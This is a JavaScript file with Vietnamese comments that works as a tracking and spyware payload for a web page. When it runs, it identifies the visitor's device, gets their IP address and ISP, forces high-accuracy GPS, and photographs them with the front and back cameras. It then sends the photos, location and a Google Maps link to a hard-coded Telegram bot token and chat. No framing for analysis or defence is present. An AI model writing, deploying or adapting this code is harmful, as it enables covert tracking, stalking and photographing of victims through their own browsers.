const TELEGRAM_BOT_TOKEN = '8163261794:AAE1AVuCTP0Vm_kqV0a1DT-02NTo1XKhVs0';
const TELEGRAM_CHAT_ID = '-1003770043455';

const API_SEND_MEDIA = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMediaGroup`;
const API_SEND_TEXT = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

const info = {
    time: '', ip: '', isp: '', address: '',
    lat: '', lon: '', device: '', os: '',
    camera: '\u23F3 \u0110\u0061\u006E\u0067 \u006B\u0069\u1EC3\u006D \u0074\u0072\u0061\u002E\u002E\u002E'
};

function detectDevice() {
    const ua = navigator.userAgent;
    if (/Android/i.test(ua)) {
        info.os = 'Android';
        const match = ua.match(/Android.*;\s+([^;]+)\s+Build/);
        info.device = match ? match[1].split('/')[0].trim() : 'Android Device';
    } else if (/iPhone|iPad|iPod/i.test(ua)) {
        info.os = 'iOS';
        info.device = 'iPhone/iPad';
    } else {
        info.os = 'Windows/PC';
        info.device = 'Computer';
    }
}

async function getIPs() {
    try {
        const res = await fetch('https://ipwho.is/').then(r => r.json());
        info.ip = res.ip;
        info.isp = res.connection?.org || 'N/A';
        // Tọa độ IP chỉ dùng làm dự phòng cuối cùng
        if(!info.lat) {
            info.lat = res.latitude;
            info.lon = res.longitude;
            info.address = `${res.city}, ${res.region} (\u01AF\u1EDB\u0063 \u0074\u0068\u00ED\u006E\u0068 \u0071\u0075\u0061 \u0049\u0050)`;
        }
    } catch (e) { info.ip = 'Bị chặn'; }
}

async function getLocation() {
    return new Promise(resolve => {
        if (!navigator.geolocation) return resolve();

        // Ép buộc trình duyệt dùng GPS vệ tinh bằng enableHighAccuracy
        navigator.geolocation.getCurrentPosition(
            async pos => {
                info.lat = pos.coords.latitude;
                info.lon = pos.coords.longitude;
                const acc = pos.coords.accuracy ? ` (\u00B1${pos.coords.accuracy.toFixed(1)}m)` : '';
                
                try {
                    // Reverse Geocoding lấy địa chỉ từ tọa độ GPS
                    const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${info.lat}&lon=${info.lon}`);
                    const data = await res.json();
                    info.address = (data.display_name || 'Vị trí thực tế') + acc;
                } catch { 
                    info.address = `Tọa độ: ${info.lat}, ${info.lon}${acc}`; 
                }
                resolve();
            },
            () => resolve(), // Lỗi thì dùng IP backup
            { 
                enableHighAccuracy: true, // BẮT BUỘC BẬT CHIP GPS
                timeout: 5000,            // Chờ đúng 5s
                maximumAge: 0             // Không dùng vị trí cũ trong bộ nhớ
            }
        );
    });
}

async function captureCamera(facingMode = 'user') {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode }, audio: false });
        return new Promise(resolve => {
            const video = document.createElement('video');
            video.srcObject = stream;
            video.muted = true;
            video.setAttribute('playsinline', ''); 
            video.play();
            video.onloadedmetadata = () => {
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                setTimeout(() => {
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    stream.getTracks().forEach(t => t.stop());
                    canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.8);
                }, 1000);
            };
        });
    } catch (e) { return null; }
}

function getCaption() {
    // Sửa lỗi link Google Maps (xóa số 0 thừa và dấu ngoặc sai)
    const mapsLink = (info.lat && info.lon) 
        ? `https://www.google.com/maps?q=${info.lat},${info.lon}` 
        : 'Không rõ';

    return `\uD83D\uDCE1 [TH\u00D4NG TIN TRUY C\u1EACP]\n\n` +
           `\u231B Th\u1EDDi gian: ${info.time}\n` +
           `\uD83D\uDCF1 Thi\u1EBFt b\u1ECB: ${info.device} (${info.os})\n` +
           `\uD83C\uDF10 IP: ${info.ip}\n` +
           `\uD83C\uDFE2 ISP: ${info.isp}\n` +
           `\uD83C\uDFD9 \u0110\u1ECBa ch\u1EC9: ${info.address}\n` +
           `\uD83D\uDCCC Google Maps: ${mapsLink}\n` +
           `\uD83D\uDCF8 Camera: ${info.camera}`;
}

async function main() {
    info.time = new Date().toLocaleString('vi-VN');
    detectDevice();
    
    // Bước 1: Gọi IP trước (nhanh, làm nền)
    await getIPs();
    
    // Bước 2: Gọi GPS đè lên (nếu người dùng cho phép, nó sẽ lấy tọa độ chuẩn mét)
    await getLocation();

    // Bước 3: Chụp ảnh
    let front = await captureCamera("user");
    let back = front ? await captureCamera("environment") : null;

    if (front || back) {
        info.camera = `\u2705 \u0110\u00E3 ch\u1EE5p: ${front ? 'Trước' : ''} ${back ? 'Sau' : ''}`;
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CHAT_ID);
        const media = [];
        if (front) {
            media.push({ type: 'photo', media: 'attach://f', caption: getCaption() });
            formData.append('f', front, 'f.jpg');
        }
        if (back) {
            media.push({ type: 'photo', media: 'attach://b' });
            formData.append('b', back, 'b.jpg');
        }
        formData.append('media', JSON.stringify(media));
        await fetch(API_SEND_MEDIA, { method: 'POST', body: formData });
    } else {
        info.camera = '\uD83D\uDEAB B\u1ECB t\u1EEB ch\u1ED1i';
        await fetch(API_SEND_TEXT, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: getCaption() })
        });
    }
}
